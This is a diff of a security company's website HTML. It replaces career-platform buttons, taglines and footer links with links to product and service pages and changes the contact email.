-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -3165,11 +3675,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -3192,59 +3702,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
